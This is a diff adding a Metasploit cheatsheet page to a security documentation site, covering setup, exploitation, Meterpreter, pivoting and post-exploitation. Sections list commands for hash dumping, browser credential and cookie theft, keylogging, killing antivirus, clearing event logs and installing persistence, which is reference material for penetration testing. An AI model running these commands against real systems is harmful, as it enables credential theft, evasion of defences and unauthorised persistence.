@@ -4,8 +4,608 @@ description: Metasploit is a penetration testing framework that allows you to te
 icon: "BugPlay"
 ---
 
-# Metasploit
+import { Tab, Tabs } from 'fumadocs-ui/components/tabs';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+import { Accordion, Accordions } from 'fumadocs-ui/components/accordion';
 
-Metasploit is a penetration testing framework that allows you to test the security of your network.
+![metasploit-image](./metasploit.jpg)
 
-## What is Metasploit?
+<Callout title="Metasploit Framework" type="info">
+  Metasploit is an open-source penetration testing framework that enables security professionals to find, exploit, and validate vulnerabilities. It provides a complete environment for penetration testing and exploit development.
+</Callout>
+
+# Metasploit Cheatsheet
+
+## 1. Getting Started
+
+<Tabs items={["About Metasploit", "Framework Architecture", "What is Metasploit?", "Installation & Setup"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">About Metasploit</h4>
+      <p>Metasploit is a powerful penetration testing framework that includes:</p>
+      <ul className="list-disc pl-5 mt-2">
+        <li>Exploit Database</li>
+        <li>Payload Generator</li>
+        <li>Auxiliary Modules</li>
+        <li>Post-Exploitation Tools</li>
+        <li>Meterpreter</li>
+      </ul>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Framework Architecture</h4>
+      <p>Metasploit's modular architecture consists of:</p>
+      <ul className="list-disc pl-5 mt-2">
+        <li>Libraries</li>
+        <li>Interfaces</li>
+        <li>Modules</li>
+        <li>Tools</li>
+        <li>Plugins</li>
+      </ul>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">What is Metasploit?</h4>
+      <p>Metasploit is designed for:</p>
+      <ul className="list-disc pl-5 mt-2">
+        <li>Penetration Testing</li>
+        <li>Exploit Development</li>
+        <li>Vulnerability Research</li>
+        <li>Security Assessment</li>
+        <li>Red Team Operations</li>
+      </ul>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Installation & Setup</h4>
+      <div className="space-y-6">
+        <div>
+          <h5 className="font-semibold mb-2">Installing Metasploit</h5>
+          <Steps>
+            <Step>
+              <strong>Linux:</strong>
+              ```bash
+              curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+              chmod +x msfinstall
+              ./msfinstall
+              ```
+            </Step>
+            <Step>
+              <strong>Database Setup:</strong>
+              ```bash
+              # Start PostgreSQL
+              service postgresql start
+              
+              # Initialize database
+              msfdb init
+              ```
+            </Step>
+          </Steps>
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 2. Basic Operations
+
+<Tabs items={["Console Commands", "Database", "Module Types", "Basic Usage"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Console Commands</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Starting Metasploit</h5>
+          ```bash
+          # Start the console
+          msfconsole
+
+          # Version check
+          version
+
+          # Update framework
+          msfupdate
+
+          # Help menu
+          help
+          ```
+        </div>
+        <div>
+          <h5 className="font-bold mb-2">Basic Navigation</h5>
+          ```bash
+          # Show all commands
+          help
+
+          # Show module-specific help
+          help [command]
+
+          # Search modules
+          search [term]
+
+          # Use a module
+          use [module_path]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Database Operations</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Database Commands</h5>
+          ```bash
+          # Check database status
+          db_status
+
+          # Create/connect database
+          db_connect [name]
+
+          # Import scan results
+          db_import [file]
+
+          # Show hosts
+          hosts
+
+          # Show services
+          services
+
+          # Show vulnerabilities
+          vulns
+          ```
+        </div>
+        <div>
+          <h5 className="font-bold mb-2">Workspace Management</h5>
+          ```bash
+          # List workspaces
+          workspace
+
+          # Create workspace
+          workspace -a [name]
+
+          # Switch workspace
+          workspace [name]
+
+          # Delete workspace
+          workspace -d [name]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Module Types</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Available Modules</h5>
+          ```bash
+          # Show all exploits
+          show exploits
+
+          # Show all payloads
+          show payloads
+
+          # Show all auxiliary modules
+          show auxiliary
+
+          # Show all post modules
+          show post
+
+          # Show all encoders
+          show encoders
+
+          # Show all nops
+          show nops
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Basic Usage</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Module Usage</h5>
+          ```bash
+          # Set options
+          set [option] [value]
+          setg [option] [value]  # Global setting
+
+          # Show options
+          show options
+          show advanced
+          show targets
+          show payloads
+
+          # Execute module
+          exploit
+          run
+
+          # Background session
+          background
+          sessions -l  # List sessions
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 3. Exploitation
+
+<Tabs items={["Exploit Usage", "Payload Selection", "Post Exploitation", "Session Management"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Exploit Usage</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Basic Exploitation</h5>
+          ```bash
+          # Select exploit
+          use exploit/[path]
+
+          # Show targets
+          show targets
+
+          # Set target
+          set target [number]
+
+          # Check if target is vulnerable
+          check
+
+          # Launch exploit
+          exploit
+          exploit -j  # As background job
+          exploit -z  # Don't interact with session
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Payload Selection</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Payload Management</h5>
+          ```bash
+          # Show compatible payloads
+          show payloads
+
+          # Set payload
+          set payload [payload_path]
+
+          # Generate payload
+          generate
+          generate -h  # Show options
+          generate -f [format]
+          generate -e [encoder]
+          generate -o [output_file]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Post Exploitation</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Post Modules</h5>
+          ```bash
+          # Show post modules
+          show post
+
+          # Use post module
+          use post/[module_path]
+
+          # Run post module
+          run
+
+          # Gather system info
+          run post/multi/gather/env
+          run post/windows/gather/hashdump
+          run post/linux/gather/hashdump
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Session Management</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Session Commands</h5>
+          ```bash
+          # List sessions
+          sessions -l
+
+          # Interact with session
+          sessions -i [id]
+
+          # Kill session
+          sessions -k [id]
+
+          # Run command in all sessions
+          sessions -C [command]
+
+          # Upgrade shell to meterpreter
+          sessions -u [id]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 4. Meterpreter
+
+<Tabs items={["Basic Commands", "System Commands", "Network Commands", "File Operations"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Basic Commands</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Core Commands</h5>
+          ```bash
+          # Get help
+          help
+
+          # Show system information
+          sysinfo
+
+          # Get current user
+          getuid
+
+          # Get system privileges
+          getprivs
+
+          # Elevate privileges
+          getsystem
+
+          # Drop to shell
+          shell
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">System Commands</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Process Management</h5>
+          ```bash
+          # List processes
+          ps
+
+          # Migrate to process
+          migrate [pid]
+
+          # Kill process
+          kill [pid]
+
+          # Execute command
+          execute -f [command]
+          execute -H -i -f cmd.exe  # Hidden & Interactive
+
+          # Load extension
+          load [extension]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Network Commands</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Network Operations</h5>
+          ```bash
+          # Network interfaces
+          ipconfig
+
+          # Routing table
+          route
+
+          # Port forwarding
+          portfwd add -l [lport] -p [rport] -r [rhost]
+
+          # Network statistics
+          netstat
+
+          # Packet sniffing
+          load sniffer
+          sniffer_interfaces
+          sniffer_start [interface]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">File Operations</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">File System Commands</h5>
+          ```bash
+          # Navigate directories
+          pwd
+          cd [directory]
+          ls
+
+          # File operations
+          cat [file]
+          edit [file]
+          mkdir [directory]
+          rm [file]
+          rmdir [directory]
+
+          # File transfer
+          download [src] [dst]
+          upload [src] [dst]
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## 5. Advanced Features
+
+<Tabs items={["Pivoting", "Persistence", "Evasion", "Data Gathering"]}>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-blue-600 dark:text-blue-400">Pivoting</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Network Pivoting</h5>
+          ```bash
+          # Add route
+          run autoroute -s [subnet]
+
+          # List routes
+          run autoroute -p
+
+          # Port forwarding
+          portfwd add -l [lport] -p [rport] -r [rhost]
+
+          # SOCKS proxy
+          use auxiliary/server/socks4a
+          run
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-green-600 dark:text-green-400">Persistence</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Persistence Mechanisms</h5>
+          ```bash
+          # Windows persistence
+          run persistence -X -i 30 -p 443 -r [LHOST]
+
+          # Scheduled tasks
+          run scheduleme
+
+          # Service installation
+          run service_persistence
+
+          # Registry persistence
+          run persistence -S
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-purple-600 dark:text-purple-400">Evasion</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Evasion Techniques</h5>
+          ```bash
+          # Encode payload
+          set EnableStageEncoding true
+          set StageEncoder x86/shikata_ga_nai
+
+          # Process migration
+          run post/windows/manage/migrate
+
+          # Kill antivirus
+          run post/windows/manage/killav
+
+          # Clear event logs
+          clearev
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+  <Tab>
+    <div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+      <h4 className="font-bold mb-2 text-red-600 dark:text-red-400">Data Gathering</h4>
+      <div className="space-y-4">
+        <div>
+          <h5 className="font-bold mb-2">Information Collection</h5>
+          ```bash
+          # Dump hashes
+          run post/windows/gather/hashdump
+
+          # Collect credentials
+          run post/windows/gather/credentials/credential_collector
+
+          # Browser data
+          run post/multi/gather/firefox_creds
+          run post/multi/gather/chrome_cookies
+
+          # Keylogging
+          keyscan_start
+          keyscan_dump
+          keyscan_stop
+          ```
+        </div>
+      </div>
+    </div>
+  </Tab>
+</Tabs>
+
+## Sources
+
+<div className="p-4 border rounded-lg bg-white dark:bg-gray-800 my-4">
+  <h4 className="font-bold mb-4">References</h4>
+  <ul className="list-disc pl-5 space-y-2">
+    <a href="https://docs.metasploit.com/" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      Metasploit Documentation
+    </a>
+    - Official Metasploit Framework documentation
+
+    <a href="https://github.com/rapid7/metasploit-framework" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      Metasploit Framework GitHub
+    </a>
+    - Official GitHub repository
+
+    <a href="https://www.offensive-security.com/metasploit-unleashed/" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      Metasploit Unleashed
+    </a>
+    - Free Offensive Security Metasploit course
+
+    <a href="https://www.rapid7.com/blog/tag/metasploit/" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      Rapid7 Metasploit Blog
+    </a>
+    - Latest updates and tutorials from Rapid7
+
+    <a href="https://www.hackthebox.com/files/cheatsheet-using-the-metasploit-framework.pdf" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      HackTheBox Metasploit Cheatsheet
+    </a>
+    - Comprehensive cheatsheet by HackTheBox
+
+    <a href="https://www.hackbysecurity.com/blog/metasploit-cheat-sheet-1" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      HackBySecurity Metasploit Guide
+    </a>
+    - Detailed guide and cheatsheet in Spanish and English
+
+    <a href="https://github.com/RiccardoAncarani/metasploit_cheatsheet" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      Riccardo Ancarani's Metasploit Cheatsheet
+    </a>
+    - Community-maintained cheatsheet with practical examples
+
+    <a href="https://github.com/ByteSnipers/awesome-pentest-cheat-sheets" className="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
+      ByteSnipers Pentest Cheatsheets
+    </a>
+    - Collection of penetration testing cheatsheets including Metasploit
+  </ul>
+</div>
